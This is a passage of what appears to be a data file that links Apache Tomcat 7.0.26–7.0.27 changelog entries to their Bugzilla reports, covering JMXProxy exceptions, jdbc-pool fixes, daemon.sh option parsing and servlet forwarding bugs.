ValidationInterval: 1800000 
Connection:
ProxyConnection[PooledConnection[oracle.jdbc.driver.T4CConnection@17f8b39]] 
NumIdle: 2 
AccessToUnderlyingConnectionAllowed: true 
Url: jdbc:oracle:thin:@(DESCRIPTION =(ADDRESS = (PROTOCOL = TCP)(HOST =
localhost)(PORT = 1580))(CONNECT_DATA =(SERVER = DEDICATED)( SERVICE_NAME =
anywhere.com )(INSTANCE_NAME = xxx)(SID = xxx))) 
Size: 4 
Active: 2 
AlternateUsernameAllowed: false 
TestOnBorrow: true 
LoginTimeout: 6 
MaxActive: 100 
MaxAge: 0 
SuspectTimeout: 0 
Pool: org.apache.tomcat.jdbc.pool.ConnectionPool@9283bf 
NumTestsPerEvictionRun: 0 
Name: Tomcat Connection Pool[1-6300663] 
MaxWait: 6000 
PoolProperties: ConnectionPool[defaultAutoCommit=null; defaultReadOnly=null;
defaultTransactionIsolation=-1; defaultCatalog=null;
driverClassName=oracle.jdbc.driver.OracleDriver; maxActive=100; maxIdle=100;
minIdle=10; initialSize=10; maxWait=6000; testOnBorrow=true;
testOnReturn=false; timeBetweenEvictionRunsMillis=30000;
numTestsPerEvictionRun=0; minEvictableIdleTimeMillis=30000;
testWhileIdle=false; testOnConnect=false; password=xxxxx;
url=jdbc:oracle:thin:@(DESCRIPTION =(ADDRESS = (PROTOCOL = TCP)(HOST =
localhost)(PORT = 1580))(CONNECT_DATA =(SERVER = DEDICATED)( SERVICE_NAME =
anywhere.com )(INSTANCE_NAME = xxx)(SID = xxx))); username=xxx;
validationQuery=SELECT 1 FROM dual; validationInterval=1800000;
accessToUnderlyingConnectionAllowed=true; removeAbandoned=true;
removeAbandonedTimeout=60; logAbandoned=true; connectionProperties=null;
initSQL=null;
jdbcInterceptors=org.apache.tomcat.jdbc.pool.interceptor.ConnectionState;org.apache.tomcat.jdbc.pool.interceptor.StatementFinalizer;
jmxEnabled=true; fairQueue=false; useEquals=false; abandonWhenPercentageFull=0;
maxAge=0; useLock=false; dataSource=null; dataSourceJNDI=null;
alternateUsernameAllowed=false; 
PoolName: Tomcat Connection Pool[1-6300663] 
WaitCount: 0 
JmxEnabled: true 
TestWhileIdle: false 
UseEquals: false 
UseLock: false 
DriverClassName: oracle.jdbc.driver.OracleDriver 
RemoveAbandonedTimeout: 60 
DbProperties: {user=xxxx, password=xxxx} 
Idle: 2 
LogAbandoned: true 
FairQueue: false 
PoolSweeperEnabled: true 
ConnectionAsync:
org.apache.tomcat.jdbc.pool.ConnectionPool$ConnectionFuture@e9c2d3 
JdbcInterceptorsAsArray:
Array[org.apache.tomcat.jdbc.pool.PoolProperties$InterceptorDefinition] of
length 2 
       
org.apache.tomcat.jdbc.pool.PoolProperties$InterceptorDefinition@125f027 
       
org.apache.tomcat.jdbc.pool.PoolProperties$InterceptorDefinition@1b99628 
RemoveAbandoned: true 
TimeBetweenEvictionRunsMillis: 30000 
MinEvictableIdleTimeMillis: 30000 
InitialSize: 10 


After upgrading to 7.0.26 the JMXProxy URLs still return the correct data
however I am now seeing the following exceptions in the Tomcat logs. 


Mar 6, 2012 9:17:40 AM org.apache.catalina.mbeans.MBeanDumper dumpBeans 
SEVERE: Error getting attribute Catalina:type=Executor,name=tomcatThreadPool
prestartminSpareThreads 
javax.management.ReflectionException: Cannot find getter method
getPrestartminSpareThreads 
        at
org.apache.tomcat.util.modeler.ManagedBean.getGetter(ManagedBean.java:517) 
        at
org.apache.tomcat.util.modeler.BaseModelMBean.getAttribute(BaseModelMBean.java:181) 
        at
com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:666) 
        at
com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:638) 
        at
org.apache.catalina.mbeans.MBeanDumper.dumpBeans(MBeanDumper.java:82) 
        at
org.apache.catalina.manager.JMXProxyServlet.listBeans(JMXProxyServlet.java:172) 
        at
org.apache.catalina.manager.JMXProxyServlet.doGet(JMXProxyServlet.java:121) 
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:621) 
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:722) 
        at
org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305) 
        at
org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210) 
        at
org.apache.catalina.filters.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:108) 
        at
org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243) 
        at
org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210) 
        at
org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:224) 
        at
org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:169) 
        at
org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:581) 
        at
org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168) 
        at
org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98) 
        at
org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:927) 
        at
org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118) 
        at
org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407) 
        at
org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:987) 
        at
org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:579) 
        at
org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:307) 
        at
java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 
        at
java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 
        at java.lang.Thread.run(Thread.java:619) 
Caused by: java.lang.NoSuchMethodException:
org.apache.catalina.core.StandardThreadExecutor.getPrestartminSpareThreads() 
        at java.lang.Class.getMethod(Class.java:1605) 
        at
org.apache.tomcat.util.modeler.ManagedBean.getGetter(ManagedBean.java:510) 
        ... 27 more 
Mar 6, 2012 9:17:40 AM org.apache.catalina.mbeans.MBeanDumper dumpBeans 
SEVERE: Error getting attribute Catalina:type=Executor,name=tomcatThreadPool
daemon 
javax.management.ReflectionException: Cannot find getter method getDaemon 
        at
org.apache.tomcat.util.modeler.ManagedBean.getGetter(ManagedBean.java:517) 
        at
org.apache.tomcat.util.modeler.BaseModelMBean.getAttribute(BaseModelMBean.java:181) 
        at
com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:666) 
        at
com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:638) 
        at
org.apache.catalina.mbeans.MBeanDumper.dumpBeans(MBeanDumper.java:82) 
        at
org.apache.catalina.manager.JMXProxyServlet.listBeans(JMXProxyServlet.java:172) 
        at
org.apache.catalina.manager.JMXProxyServlet.doGet(JMXProxyServlet.java:121) 
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:621) 
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:722) 
        at
org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305) 
        at
org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210) 
        at
org.apache.catalina.filters.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:108) 
        at
org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243) 
        at
org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210) 
        at
org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:224) 
        at
org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:169) 
        at
org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:581) 
        at
org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168) 
        at
org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98) 
        at
org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:927) 
        at
org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118) 
        at
org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407) 
        at
org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:987) 
        at
org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:579) 
        at
org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:307) 
        at
java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 
        at
java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 
        at java.lang.Thread.run(Thread.java:619) 
Caused by: java.lang.NoSuchMethodException:
org.apache.catalina.core.StandardThreadExecutor.getDaemon() 
        at java.lang.Class.getMethod(Class.java:1605) 
        at
org.apache.tomcat.util.modeler.ManagedBean.getGetter(ManagedBean.java:510) 
        ... 27 more 


Mar 6, 2012 9:18:20 AM org.apache.catalina.mbeans.MBeanDumper dumpBeans 
SEVERE: Error getting attribute bean:name=eventingDataSource PooledConnection 
javax.management.MBeanException: RuntimeException thrown in RequiredModelMBean
while trying to invoke operation getPooledConnection 
        at
javax.management.modelmbean.RequiredModelMBean.invokeMethod(RequiredModelMBean.java:1091) 
        at
javax.management.modelmbean.RequiredModelMBean.invoke(RequiredModelMBean.java:955) 
        at
org.springframework.jmx.export.SpringModelMBean.invoke(SpringModelMBean.java:90) 
        at
javax.management.modelmbean.RequiredModelMBean.getAttribute(RequiredModelMBean.java:1358) 
        at
org.springframework.jmx.export.SpringModelMBean.getAttribute(SpringModelMBean.java:109) 
        at
com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:666) 
        at
com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:638) 
        at
org.apache.catalina.mbeans.MBeanDumper.dumpBeans(MBeanDumper.java:82) 
        at
org.apache.catalina.manager.JMXProxyServlet.listBeans(JMXProxyServlet.java:172) 
        at
org.apache.catalina.manager.JMXProxyServlet.doGet(JMXProxyServlet.java:121) 
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:621) 
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:722) 
        at
org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305) 
        at
org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210) 
        at
org.apache.catalina.filters.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:108) 
        at
org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243) 
        at
org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210) 
        at
org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:224) 
        at
org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:169) 
        at
org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:581) 
        at
org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168) 
        at
org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98) 
        at
org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:927) 
        at
org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118) 
        at
org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407) 
        at
org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:987) 
        at
org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:579) 
        at
org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:307) 
        at
java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 
        at
java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 
        at java.lang.Thread.run(Thread.java:619) 
Caused by: java.lang.ClassCastException: $Proxy5 cannot be cast to
org.apache.tomcat.jdbc.pool.PooledConnection 
        at
org.apache.tomcat.jdbc.pool.DataSourceProxy.getPooledConnection(DataSourceProxy.java:156) 
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
        at
sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) 
        at
sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) 
        at java.lang.reflect.Method.invoke(Method.java:597) 
        at sun.reflect.misc.Trampoline.invoke(MethodUtil.java:37) 
        at sun.reflect.GeneratedMethodAccessor31.invoke(Unknown Source) 
        at
sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) 
        at java.lang.reflect.Method.invoke(Method.java:597) 
        at sun.reflect.misc.MethodUtil.invoke(MethodUtil.java:244) 
        at
javax.management.modelmbean.RequiredModelMBean.invokeMethod(RequiredModelMBean.java:1074) 
        ... 30 more 
Mar 6, 2012 9:18:22 AM org.apache.catalina.mbeans.MBeanDumper dumpBeans 
SEVERE: Error getting attribute bean:name=eventingDataSource XAConnection 
javax.management.MBeanException: Exception thrown in RequiredModelMBean while
trying to invoke operation getXAConnection 
        at
javax.management.modelmbean.RequiredModelMBean.invokeMethod(RequiredModelMBean.java:1101) 
        at
javax.management.modelmbean.RequiredModelMBean.invoke(RequiredModelMBean.java:955) 
        at
org.springframework.jmx.export.SpringModelMBean.invoke(SpringModelMBean.java:90) 
        at
javax.management.modelmbean.RequiredModelMBean.getAttribute(RequiredModelMBean.java:1358) 
        at
org.springframework.jmx.export.SpringModelMBean.getAttribute(SpringModelMBean.java:109) 
        at
com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:666) 
        at
com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:638) 
        at
org.apache.catalina.mbeans.MBeanDumper.dumpBeans(MBeanDumper.java:82) 
        at
org.apache.catalina.manager.JMXProxyServlet.listBeans(JMXProxyServlet.java:172) 
        at
org.apache.catalina.manager.JMXProxyServlet.doGet(JMXProxyServlet.java:121) 
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:621) 
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:722) 
        at
org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305) 
        at
org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210) 
        at
org.apache.catalina.filters.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:108) 
        at
org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243) 
        at
org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210) 
        at
org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:224) 
        at
org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:169) 
        at
org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:581) 
        at
org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168) 
        at
org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98) 
        at
org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:927) 
        at
org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118) 
        at
org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407) 
        at
org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:987) 
        at
org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:579) 
        at
org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:307) 
        at
java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 
        at
java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 
        at java.lang.Thread.run(Thread.java:619) 
Caused by: java.sql.SQLException: Connection from pool does not implement
javax.sql.XAConnection 
        at
org.apache.tomcat.jdbc.pool.DataSourceProxy.getXAConnection(DataSourceProxy.java:134) 
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
        at
sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) 
        at
sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) 
        at java.lang.reflect.Method.invoke(Method.java:597) 
        at sun.reflect.misc.Trampoline.invoke(MethodUtil.java:37) 
        at sun.reflect.GeneratedMethodAccessor31.invoke(Unknown Source) 
        at
sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) 
        at java.lang.reflect.Method.invoke(Method.java:597) 
        at sun.reflect.misc.MethodUtil.invoke(MethodUtil.java:244) 
        at
javax.management.modelmbean.RequiredModelMBean.invokeMethod(RequiredModelMBean.java:1074) 
        ... 30 more 


The documentation mentioned the JMXProxy interface should remain the same
during this upgrade so we are a little confused with the exceptions.  To add a
little more detail we have enabled all the new Manager roles while we test this
issue. 

  <role rolename=""admin-gui""/>
  <role rolename=""admin-script""/>

  <role rolename=""manager-gui""/>
  <role rolename=""manager-script""/>
  <role rolename=""manager-jmx""/>
  <role rolename=""manager-status""/>

  <user username=""xxxx"" password=""xxxx""
roles=""admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status""/>

Any ideas? 

Thanks in advance, 

Jonathan"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52842
Web applications|Tomcat 7.0.27 (markt)|update||Bring built-in mime types for embedded Tomcat more in line with the ones defined in the default web.xml configuration file. (rjung)|||
Web applications|Tomcat 7.0.27 (markt)|add||Add support to the JMXProxyServlet which is part of the Manager application for fetching a specific key from a CompositeData value. Updated documentation, so that the entire 'get' command for the JMX proxy servlet is documented, including the new optional 'key' parameter. (schultz/markt)|||
jdbc-pool|Tomcat 7.0.27 (markt)|update||Pool cleaner thread should be created using the classloader that loaded the pool, not the context loader (fhanik)|||
jdbc-pool|Tomcat 7.0.27 (markt)|fix|52804|Make pool properties serializable and cloneable. (fhanik)|Make PoolProperties implement Cloneable.|"It would be very useful to have the PoolProperties class implement the java.lang.Cloneable interface. 

We have many databases that share the same schema, username, password, configuration etc but differ only in their URL. Implementing a routing datasource based on something like org.springframework.jdbc.datasource.AbstractDataSource can then just clone a PoolProperties object and set the one or two properties that differ in the clone. In a spring project the properties that are common across all the datasources are only supplied once."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52804
jdbc-pool|Tomcat 7.0.27 (markt)|fix||51237 (r1302902): Slow Query Report should log using WARN level when queries are slow and within the threshold of caching it. (fhanik)|SlowQueryReport interceptor does not log anything|The documentation I've seen for the SlowQueryInterceptor (http://people.apache.org/~fhanik/jdbc-pool/jdbc-pool.html#org.apache.tomcat.jdbc.pool.interceptor.SlowQueryReport) indicate that it is supposed to log a message with level WARN when a slow query is detected or there is a failure.  However, it appears that no logging is ever done.  reportSlowQuery and reportFailedQuery simply record the event with the QueryStats object.  No call to the logging framework is ever made.|https://bz.apache.org/bugzilla/show_bug.cgi?id=51237
jdbc-pool|Tomcat 7.0.27 (markt)|fix||52002 (r1302948): Add in configuration option to disallow connection reuse. (r1305862): useDisposableConnectionFacade is by default enabled (fhanik)|Pool re-opens and re-issues closed connection|"Created attachment 27751 [details]
Patch to create new test case and fix to make it work

Closing a connection returns the connection to the pool but does not clear its handler (the JDBC interceptor chain).  As a result, the next request for a connection may re-open and return the old handler.

This behavior breaks multi-threaded code which closes a connection twice.  The exact behavior being that thread 1 closes a connection, thread 2 opens a new connection and gets the exact same connection object as thread 1, thread 1 then closes is connection a second time thereby breaking thread 2.

I'm attaching a patch with a new test case which fails against the current revision as well as a fix for ConnectionPool."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52002
jdbc-pool|Tomcat 7.0.27 (markt)|fix||52493 (r1302969): Java 7 DataSource method addition. (fhanik)|Add java7 support|We need CommonDataSource's getParentLogger() method to be implemented for java7 support.|https://bz.apache.org/bugzilla/show_bug.cgi?id=52493
jdbc-pool|Tomcat 7.0.27 (markt)|fix||51893 (r1302990): Throw an error and notification when pool is exhausted. (fhanik)|JMX notification/Exception for empty/exhausted connection pool|"Currently, if there is an error getting a connection from the pool, a generic SQLException is thrown.  The only way to determine if the problem is a result of the connection pool being exhausted is to catch the SQLException and parse the message (i.e. look for ""Pool empty"" in ex.getMessage()).  Would like to see the following:

1) A subclass of SQLException thrown in the case of an empty pool
2) A JMX notification sent in the case of an empty pool (e.g. [POOL EXHAUSTED])"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51893
jdbc-pool|Tomcat 7.0.27 (markt)|fix||50860 (r1303031): Add in option to configure logging for validation errors. (fhanik)|In case of invalid or empty slqQuery connection are always invalidated without usefull information|"The code is (in PooledConnection.java#validate(int validateAction,String sql) )
        Statement stmt = null;
        try {
            stmt = connection.createStatement();
            stmt.execute(query);
            stmt.close();
            this.lastValidated = now;
            return true;
        } catch (Exception ignore) {
            if (log.isDebugEnabled())
                log.debug(""Unable to validate object:"",ignore);
            if (stmt!=null)
                try { stmt.close();} catch (Exception ignore2){/*NOOP*/}
        }
        return false;

So in the case of null or invalid query (connection is always invalidated : seems normal :-) ).
But without any usefull message (except if you use debug : but seems complicated in a production env).
So IMHO adding a log.warning in case of null query could be usefull."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50860
jdbc-pool|Tomcat 7.0.27 (markt)|fix||52066 (r1305931): Add in configuration option, progagateInterruptState, to allow threads to retain the interrupt state. (fhanik)|ConnectionPool.borrowConnection swallows interrupt state.|"In this code snippet starting on line 6.15 of ConnectionPool.java version 7.0.22

    try {
        //retrieve an existing connection
        con = idle.poll(timetowait, TimeUnit.MILLISECONDS);
    } catch (InterruptedException ex) {
        Thread.interrupted();//clear the flag, and bail out
        SQLException sx = new SQLException(""Pool wait interrupted."");
        sx.initCause(ex);
        throw sx;
    } finally {
        waitcount.decrementAndGet();
    }

The line marked '//clear the flag, and bail out' is wrong, because after that there is no way for calling code to find out that the thread has been interrupted.

The correct behavior should be

    Thread.currentThread( ).interrupt( );

Here is the excerpt from the Biran Goetz's ""Java Concurrency in Practice"" chapter 5.4.

<!START QUOTATION>
For library code there are basically two choices:

-- Propagate the InterruptedException. This is often the most sensible policy if you can get away with it -- just propagate the InterruptedException to your caller.  This could involve not catching InterruptedException, or catching it and throwing it again after performing some brief activity-specific cleanup. 

-- Restore the interrupt. Sometimes you cannot throw InterruptedException, for instance when your code is part of a Runnable. In these situations, you must catch InterruptedException and restore the interrupted status by calling interrupt on the current thread, so that code higher up the call stack can see that an interrupt was issued.
<!END QUOTATION>

In the case of borrowConnection, #1 is not really a choice, as it is running in the confines of JDBC interface.  But it can definitely restore the interrupt status of the thread."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52066
Other|Tomcat 7.0.27 (markt)|fix|52750|Fix the way how daemon.sh parses command options so that more then one can be provided. (mturk)|daemon.sh does not allow to pass more than one option|"The daemon.sh that is packaged with 7.0.26 does not allow to pass more than one option (through the -- switch).
It appears that the shift statement inside a loop build from the command line parameter does not work as the list has been build before.

Ex:
daemon.sh --catalina-pid /tmp/c.pid --tomcat-user x start

leads to the following error:

Usage: daemon.sh ( commands ... )
commands:
  run               Start Tomcat without detaching from console
  start             Start Tomcat
  stop              Stop Tomcat
  version           What version of commons daemon and Tomcat
                    are you running?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52750
Other|Tomcat 7.0.27 (markt)|update||Rearrange validate-eoln target in build.xml so that it could be run ahead of compilation. (kkolinko)|||
Other|Tomcat 7.0.27 (markt)|update||Update Apache Commons Daemon to 1.0.10. (mturk)|||
Other|Tomcat 7.0.27 (markt)|update||Update the native component of the Tomcat APR/native connector to 1.1.23 and take advantage of the simplified distribution. (mturk)|||
Other|Tomcat 7.0.27 (markt)|update||Update to Eclipse JDT Compiler 3.7.2. (markt)|||
Catalina|Tomcat 7.0.26 (markt)|code||Provide constants for commonly used Charset objects and use these constants where appropriate. (markt)|||
Catalina|Tomcat 7.0.26 (markt)|fix||Refactor the fix for 52184 to correct two issues (a missing class and incorrect class/method names) when using the extras logging packages. (markt)|Reduce log level for invalid cookies|"Invalid cookies are fairly common. Firefox has them all the time. Tomcat logs fill up very quickly with this input. Tomcat doesn't log when there is an invalid HTTP request, as that would yield the same problem.co 

Nov 14, 2011 3:15:27 PM org.apache.tomcat.util.http.Cookies processCookieHeader
INFO: Cookies: Invalid cookie. Value not a token or quoted value

http://vmc-ssrc-rh56.eng.vmware.com:8080/

GET / HTTP/1.1
Host: vmc-ssrc-rh56.eng.vmware.com:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Cookie: __utma=106857756.14479066.1321292743.1321296794.1321304211.3; __utmz=106857756.1321304211.3.2.utmcsr=communities.example.com|utmccn=(referral)|utmcmd=referral|utmcct=/community/vmtn/appplatform/testapp_fire; s_nr=1321293934221; s_vi=[CS]v1|2760A9C4851D0F77-6000010260007567[CE]
Cache-Control: max-age=0"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52184
Catalina|Tomcat 7.0.26 (markt)|fix|52444|Only load classes during HandlesTypes processing if the class is a match. Previously, every class in the web application was loaded regardless of whether it was a match or not. (markt)|Classloading-based ServletContainerInitializer @HandlesTypes processing can result in long startup times|"See 52326 for background, noting particularly the following:

""As long as SCI processing involves expensive classloading, larger applications will suffer from long startup times and thus be encouraged to ""shut off"" this functionality via metadata-complete='true'.""

This issue, then, is intended to address classloading-based approach to @HandlesTypes processing by replacing it with something faster and generally less problematic.  ASM would be one way to get it done."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52444
Catalina|Tomcat 7.0.26 (markt)|fix|52488|Correct typo: exipre -> expire. (markt)|there is a common typo exipre|"Created attachment 28176 [details]
tomcat-6.0.35-typo.patch fixes the typos

the word expire is typed exipre in a number of places of debug log and mbean info

patch created also removes a double space"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52488
Catalina|Tomcat 7.0.26 (markt)|add||Add a unit test for SSO authentication. Patch provided by Brian Burch. (markt)|||
Catalina|Tomcat 7.0.26 (markt)|fix|52511|Correct regression in the fix for 51741 that caused a harmless exception to be logged when scanning for annotations and WEB-INF/classes did not exist. (markt)|Exception logged in annotation scanning for web apps without /WEB-INF/classes|"Created attachment 28196 [details]
error and exception trace

Any web app not containing a /WEB-INF/classes directory appears to cause an error and exception trace to be logged during web app startup.  This is new Tomcat 7.0.25 (or 7.0.24) and did not occur in 7.0.23."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52511
Catalina|Tomcat 7.0.26 (markt)|code||Refactor to remove a circular dependency between org.apache.catalina and org.apache.naming. (markt)|||
Catalina|Tomcat 7.0.26 (markt)|code||Remove some initialisation code from the standard start process (i.e. via the scripts) that was intended for embedding but is not required when performing a standard start.(markt)|||
Catalina|Tomcat 7.0.26 (markt)|add||Add new method to MBeanFactory that allows any Valve to be created and deprecate the methods to create specific Valves. (markt)|||
Catalina|Tomcat 7.0.26 (markt)|add||Partial sync of MIME type mapping with mime.types from the Apache web server. (rjung)|||
Catalina|Tomcat 7.0.26 (markt)|fix|52577|Fix a regression in the fix for 52328. Prevent output truncation when reset() is called on a response. (markt)|Response output written in filter can be truncated|"Due to changes 1229726, 1229727 and 1229728 output written to response in the filter can be truncated up to 8192 bytes. Consider the following scenario:

- you have a filter that invoke getWriter() before chain.doFilter(request, responseWrapper)


- responseWrapper overrides getWriter() method and returns some
  buffered writer, not the real one


- during execution of chain.doFilter there is a forward


Before the forward ApplicationDispather calls resetBuffer on response, which in turn calls reset() on OutputBuffer, which sets gotEnc field to false. This field is initialized in the setConverter() method which is called from response.getWriter(), but since our wrapperResponse overrides getWriter(), OutputBuffer.setConverter() never called and OutputBuffer still has gotEnc = false.


Response's close() and flushBuffer() methods call OutputBuffer's flush(), but since gotEnc == false, conv.flushBuffer() is not called:


if (gotEnc && conv != null) {
    conv.flushBuffer();
}


A workaround for us is to implement getWriter() method in responseWrapper like this:


public Writer getWriter() {
  Writer originalWriter = originalResponse.getWriter();//save for future processing
  return ourWriter;
}


Maybe you should change flushing to something like that:


if (conv != null) {
    conv.flushBuffer();
}


because you invoke conv.convert() without any checks in the write*() methods and it seems like conv is never null."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52577
Catalina|Tomcat 7.0.26 (markt)|fix|52586|Remove an old and now unnecessary hack that modified the path info reported via the javax.servlet.forward.path_info request attribute when forwarding to an error page. (markt)|When requests are forwarded, the request attribute javax.servlet.forward.path_info is assigned an incorrect value.|"As per the servlet spec, the values for:

javax.servlet.forward.request_uri
javax.servlet.forward.context
javax.servlet.forward.servlet_path
javax.servlet.forward.path_info
javax.servlet.forward.query_string

MUST be set to the values from the very first servlet that serviced the current request.  However, it seems that Tomcat is populating path_info with the value of the LAST path_info serviced in the request (i.e. the final servlet that serviced the request).  It's possible the other value assignments are afflicted by similar defects, I've not explicitly tested for this.

Because of this issue, it's impossible to correctly reconstruct the original request's URI piecemeal by concatenating context+servlet_path+path_info+?+query_string, since path_info will contain the path to another servlet and thus this concatenation will produce a probably invalid URI target.

